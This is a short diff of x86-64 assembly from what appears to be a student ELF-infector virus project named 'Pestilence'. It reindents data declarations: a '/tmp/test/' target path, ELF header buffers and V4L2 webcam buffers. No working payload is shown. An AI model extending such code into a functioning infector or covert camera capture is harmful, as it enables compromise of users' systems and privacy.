@@ -92,19 +92,20 @@ new_programheader:
     p_filez		dq	PESTILENCE_SIZE_NO_BSS
     p_memsz		dq	PESTILENCE_SIZE
     p_palign	dq	4096
-    newl	times 0001 db 0xa
-    path	db '/tmp/test/', 0
-    buffer_bss:
-    padd	times 0512 db 0
-    buff	times 4096 db 0
-    elfp0	times 0056 db 0
-    elfp1	times 0056 db 0
-    buf_addrs   times NBUF dq 0  ; adresses mmap des tampons
-    buf_sizes   times NBUF dq 0   ; leurs tailles
-    reqb        times 16   db 0         ; struct v4l2_requestbuffers
-    v4buf       times 88   db 0      ; struct v4l2_buffer (x86-64 = 88 o)
 
-    path_buffer times 256 db 0
-    comm_buff   times 32 db 0
+newl	times 0001 db 0xa
+path	db '/tmp/test/', 0
+buffer_bss:
+padd	times 0512 db 0
+buff	times 4096 db 0
+elfp0	times 0056 db 0
+elfp1	times 0056 db 0
+buf_addrs   times NBUF dq 0  ; adresses mmap des tampons
+buf_sizes   times NBUF dq 0   ; leurs tailles
+reqb        times 16   db 0         ; struct v4l2_requestbuffers
+v4buf       times 88   db 0      ; struct v4l2_buffer (x86-64 = 88 o)
+
+path_buffer times 256 db 0
+comm_buff   times 32 db 0
 
 end_addr:
